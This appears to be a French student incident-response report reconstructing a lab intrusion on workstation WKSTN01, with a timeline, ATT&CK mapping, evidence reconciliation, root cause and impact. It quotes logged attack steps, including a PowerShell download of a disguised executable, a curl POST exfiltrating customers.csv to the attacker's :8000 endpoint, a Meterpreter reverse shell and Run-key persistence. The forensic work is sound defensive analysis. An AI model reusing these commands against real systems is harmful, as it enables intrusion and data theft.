# Projet 4 — Semaine 4 : chronologie, chemin d'attaque, cause et impact

**Livrable joint (A + B).** Consolide les preuves hôte (Oussama Hamada —
`rapport-hote-s2.md`, `arbre-processus.md`) et les preuves réseau/malware
(Amir Ghdiri — `Rapport_incident_WKSTN01_Amir`).
**Fenêtre d'attaque :** 2026-10-07, ~14:00 → 15:30 UTC.
**Cible :** WKSTN01 (192.168.100.40). **Attaquant :** Kali (192.168.100.30).

---

## 1. Note méthodologique sur les horodatages (à lire avant la timeline)

Deux horloges indépendantes alimentent cette chronologie :

| Source | Machine | Référence temps |
|---|---|---|
| Sysmon / Security 4688 / Prefetch / MFT | WKSTN01 | Synchronisée sur `192.168.100.10` via `w32tm` |
| PCAP (`wk0.pcap`) + `attack.log` | Kali | Horloge locale Kali, **non synchronisée sur le même maître** |

**Conséquence.** Un décalage de quelques secondes à quelques minutes entre
les horodatages hôte et les horodatages réseau est attendu et normal. La
corrélation entre les deux sources se fait donc **par séquence et par
contenu** (ex. taille de 133 octets, même URL, même port) autant que par
l'heure absolue. Les valeurs `t=…s` d'Amir sont relatives au début de
capture (`14:00:03Z = t=0`) ; leur conversion en UTC ci-dessous est
indicative.

---

## 2. Chronologie consolidée de l'intrusion

Ordre logique de la chaîne. Colonne « Source » : **H** = hôte (Sysmon /
4688 / Prefetch / MFT), **R** = réseau (PCAP), **J** = journal `attack.log`.

| # | UTC (approx.) | Source | Événement | Technique |
|---|---|---|---|---|
| 1 | 14:00:03 | J | Début de capture `tcpdump` sur Kali (t=0) | — (jalon) |
| 2 | 14:03:12 | J | Infrastructure attaquante prête : handler Meterpreter (:4444) + serveur d'exfiltration (:8000) | — (jalon) |
| 3 | ~14:03–14:04 (t≈222–224 s) | R | Tentatives de connexion WKSTN01 → Kali **:8080** échouées (SYN → RST) — serveur de livraison pas encore joignable | — |
| 4 | 14:07:03 (t=420 s) | R | 1er `GET /invoice_october.exe` sur **:8080** → HTTP 200, `application/x-msdos-program` | T1566.001 |
| 5 | 14:09:48 | H | Sysmon 11 : création de `Downloads\invoice_october.exe` par `powershell.exe` (PID 5668) ; log PS : `Invoke-WebRequest http://192.168.100.30:8080/invoice_october.exe` | T1566.001 |
| 6 | 14:09:55 (t=592 s) | R | 2e `GET /invoice_october.exe` sur :8080 → HTTP 200 (converge avec #5 au contenu et à ±7 s) | T1566.001 |
| 7 | 15:01:30 | H | Sysmon 3 : `invoice_october.exe` → `192.168.100.30:4444` TCP (Initiated) | T1071 / port C2 non-standard |
| 8 | 15:01:32 | H | Sysmon 1 : exécution `invoice_october.exe` **PID 3568**, parent `powershell.exe`, IntegrityLevel **High**, SHA256 `5EB50394…` | T1204.002 |
| 9 | ~15:01:38 (t=3694.71 s) | R | Ouverture du canal C2 Meterpreter sur **:4444** (actif ~21 min) | T1071 / C2 |
| 10 | 15:01:40 | H | Prefetch `INVOICE_OCTOBER.EXE-45D1FC4B.pf` — **preuve d'exécution effective** | T1204.002 |
| 11 | 15:01:53 | H | Security 4688 : même exécution, même parent (confirme #8) | T1204.002 |
| 12 | **(fenêtre C2, non prouvé)** | — | Vol de credentials supposé (`load kiwi`) — **aucune preuve positive** (voir §4) | T1003.001 *(non confirmée)* |
| 13 | 15:05:09 | H | Sysmon 13 : écriture `HKCU\…\Run\WindowsUpdate = …\AppData\Roaming\sysupdate.exe` par PID 3568 | T1547.001 |
| 14 | 15:05:54 | H | MFT : création `Documents\customers.csv` (133 o) | T1041 |
| 15 | 15:05:55 | H | Security 4688 : `curl.exe -X POST @customers.csv → :8000/exfil/customers` (parent `cmd.exe`) — exfil #1 | T1041 |
| 16 | 15:08:33 | H | Sysmon 11 : création `AppData\Roaming\sysupdate.exe` par PID 3568 (binaire de persistance déposé) | T1547.001 |
| 17 | 15:08:54 (t≈4137 s) | R + J | POST `/exfil/customers` sur :8000, **corps CSV de 133 octets** reçu côté serveur — exfiltration **réussie** | T1041 *(confirmée)* |
| 18 | 15:09:53 | H | Security 4688 : 2e `curl.exe POST` identique — retry ou second envoi | T1041 |
| 19 | 15:21:21 | H | Sysmon 3 : 2e connexion `invoice_october.exe` → :4444 (canal persistant) | T1071 / C2 |
| 20 | ~15:22 (t=4971.13 s) | R | Fin du canal C2 sur :4444 | — |
| 21 | 15:12:17 | J | `attack chain complete` (clôture scénario) | — (jalon) |

> **Point de réconciliation à signaler dans le rapport (exfiltration).**
> L'hôte journalise **deux** exécutions `curl POST` (15:05:55 et 15:09:53),
> tandis que le PCAP ne montre **qu'un** POST abouti (~t=4137 s) et
> `attack.log` **une** réception (15:08:54, 133 o). Lecture honnête :
> **au moins un POST a réussi** (133 octets reçus, corroboré par le corps
> HTTP du PCAP *et* par `attack.log`) ; la seconde exécution `curl` est
> très probablement une relance. Les compteurs ne se recollent pas à la
> seconde près à cause du décalage d'horloge (§1) — on corrèle par le
> contenu (133 octets, même URL).

---

## 3. Réconciliation des ports (lève la « divergence » signalée côté réseau)

Le rapport réseau signalait une « divergence » : livraison sur `:8080` et
non sur `:4444`/`:8000`. **Ce n'est pas une contradiction — c'est une
confirmation croisée.** Les trois ports ont trois rôles distincts, et
chacun est corroboré par les deux côtés :

| Port | Rôle | Preuve hôte | Preuve réseau |
|---|---|---|---|
| **8080** | Livraison du payload (HTTP) | Log PowerShell `Invoke-WebRequest …:8080/invoice_october.exe` | 2× `GET /invoice_october.exe` HTTP 200 |
| **4444** | Canal C2 Meterpreter | Sysmon 3 ×2 (15:01:30, 15:21:21) | Canal TCP actif t=3694→4971 s (~21 min) |
| **8000** | Exfiltration HTTP | 4688 ×2 `curl POST …:8000` | POST `/exfil/customers`, corps 133 o |

**À reformuler dans le rapport final :** remplacer « la preuve PCAP
contredit la documentation » par « livraison :8080, C2 :4444, exfil :8000,
**les trois confirmés indépendamment côté hôte et côté réseau** ».

---

## 4. Verdict sur H3 — accès aux identifiants (T1003.001)

**Verdict : NON CONFIRMÉE — activité plausible dans la fenêtre C2, mais
aucune preuve positive avec les preuves préservées.**

C'est le seul maillon de la chaîne qu'**aucune** des trois voies d'analyse
n'établit positivement :

| Voie d'analyse | Ce qu'elle montre pour H3 |
|---|---|
| Hôte — Sysmon | Event 10 (process access) = **0 / 13 115**. Mais la config Sysmon chargée n'a pas été préservée → impossible de prouver qu'elle logguait l'accès à `lsass.exe`. Absence d'event ≠ absence d'accès. |
| Hôte — mémoire | `.vmem` du coffre date du **10-10**, pas de la fenêtre d'attaque → `malfind`/arbre mémoire inexploitables pour H3. |
| Réseau — PCAP | Canal Meterpreter chiffré/encodé → le `load kiwi` et le dump ne sont **pas** inspectables applicativement. |
| Malware — VirusTotal | Techniques génériques du binaire (T1129, T1574, T1027, T1036…) — **aucun indicateur mimikatz/kiwi/dump LSASS**. |

> **Pourquoi l'analyse statique ne sauvera pas H3.** Dans la chaîne S0, le
> dump de credentials se fait par `load kiwi` **réflexivement via le canal
> C2 au runtime** — l'extension kiwi n'est donc **jamais** présente sur le
> stager `invoice_october.exe` sur disque. Faire `strings`/YARA sur le
> binaire (livrable S3-B encore à produire) confirmera « stager Meterpreter »
> mais ne montrera pas mimikatz. H3 restera non confirmée même après.

**Formulation recommandée pour le rapport :** « Une activité compatible
avec un accès aux identifiants a pu se produire pendant la fenêtre C2
(T1003.001 figure dans le scénario), mais elle **n'a pas pu être confirmée
de façon indépendante** avec les preuves préservées (anomalie mémoire +
absence d'event Sysmon 10 non interprétable + C2 chiffré + périmètre
statique limité au stager). Classée *non concluante*, pas *infirmée*. »

C'est un point **fort** du dossier : il montre que l'équipe n'a pas
rubber-stampé le scénario connu mais a conclu selon la preuve réelle.

---

## 5. Chemin d'attaque (synthèse ATT&CK)

```
[Kali 192.168.100.30]                         [WKSTN01 192.168.100.40]
       │
       │  (1) GET :8080/invoice_october.exe
       ├─────────────────────────────────────►  dépôt dans Downloads
       │        T1566.001 Phishing                 (14:09:48)
       │
       │                                        (2) exécution manuelle via
       │                                            powershell Start-Process
       │                                            PID 3568, Integrity High
       │   (3) reverse_tcp :4444                    T1204.002  (15:01:32)
       │ ◄════════════════════════════════════►  canal C2 Meterpreter
       │        T1071 / C2 (~21 min)                (15:01:38 → 15:22)
       │
       │                                        (4) Run\WindowsUpdate →
       │                                            sysupdate.exe
       │                                            T1547.001  (15:05:09)
       │                                            [écrite, non armée]
       │
       │                                        (?) load kiwi / dump LSASS
       │        T1003.001 — NON CONFIRMÉE            [fenêtre C2, sans preuve]
       │
       │  (5) POST :8000/exfil/customers
       │ ◄─────────────────────────────────────  customers.csv 133 o
       │        T1041 Exfiltration                  (15:08:54)
```

| Étape | Technique ATT&CK | Verdict | Preuve principale |
|---|---|---|---|
| Livraison | **T1566.001** Phishing | Confirmée | PCAP 2× GET :8080 + log PS |
| Exécution | **T1204.002** User Execution | Confirmée | Sysmon 1 + 4688 + Prefetch |
| Persistance | **T1547.001** Registry Run Key | Confirmée (écriture) — non armée | Sysmon 13 + Sysmon 11 |
| Accès credentials | **T1003.001** LSASS | **Non concluante** | aucune (voir §4) |
| Exfiltration | **T1041** Exfil over Web | Confirmée | PCAP POST 133 o + `attack.log` + 4688 + MFT |
| C2 | **T1571 / T1071** port non-standard | Confirmée | Sysmon 3 + PCAP :4444 |

> **Correction à reporter** (issue du triage VirusTotal côté B) : la
> « tactique **TA0112 — Defense Impairment** » n'existe pas dans MITRE
> ATT&CK. Il s'agit de **TA0005 Defense Evasion** (technique
> **T1562 Impair Defenses**). À corriger avant le rapport final.

---

## 6. Cause racine et impact (1 page)

### Cause racine
L'accès initial résulte d'une **exécution manuelle d'un exécutable
malveillant par l'utilisateur** (`invoice_october.exe`, déguisé en facture),
téléchargé en HTTP depuis l'attaquant (T1566.001 → T1204.002). Aucune
vulnérabilité distante n'a été exploitée : le facteur déclenchant est
**humain** (ouverture du fichier), amplifié par un contexte d'exécution
**élevé** (IntegrityLevel High) qui a donné à la charge des droits étendus
dès le départ. Défenses contournées en amont (S0) : Defender temps réel
désactivé, dossier `Downloads` exclu.

### Impact
| Dimension | Évaluation |
|---|---|
| Confidentialité | **Atteinte confirmée** — exfiltration de `customers.csv` (133 o : `id, name, email, ssn`, 3 enregistrements fictifs type données clients) vers l'attaquant. |
| Intégrité | Système compromis : exécution de code arbitraire, écriture d'une clé de persistance, dépôt d'un binaire en `AppData\Roaming`. |
| Disponibilité | Non affectée dans le scénario (pas de rançongiciel, pas de destruction). |
| Persistance | **Tentée** (clé Run + binaire déposés, Sysmon le prouve) mais **non armée** sur l'état disque final (clé absente de `NTUSER.DAT`, `sysupdate.exe` introuvable). |
| Identifiants | Risque **non écarté** (T1003.001 non concluante) — par prudence, traiter le compte local WKSTN01 comme potentiellement compromis. |
| Périmètre | **Un seul poste** (WKSTN01). Pas de mouvement latéral (pas de DC01 dans le lab) — cohérent avec H5. |

### Sévérité globale : **Élevée**
Compromission complète d'un poste (exécution + persistance tentée + accès
élevé) **avec exfiltration de données sensibles confirmée**. L'incertitude
sur le vol de credentials impose de traiter le compte local comme
compromis par précaution (rotation obligatoire — voir S5).

---

## 7. Dépendances résolues et restantes

| Hypothèse | État avant S4 | État après S4 |
|---|---|---|
| H4 (C2 :4444) | Confirmée côté hôte, PCAP pendant | **Close** — PCAP confirme (~21 min) |
| H1, H2, H5 | Confirmées | Inchangées, corrélées réseau |
| H3 (LSASS) | Non concluante | **Verdict arrêté** : non concluante (voir §4) |

*Document prêt à alimenter S5 (contre-mesures) et S6 (rapport final).*
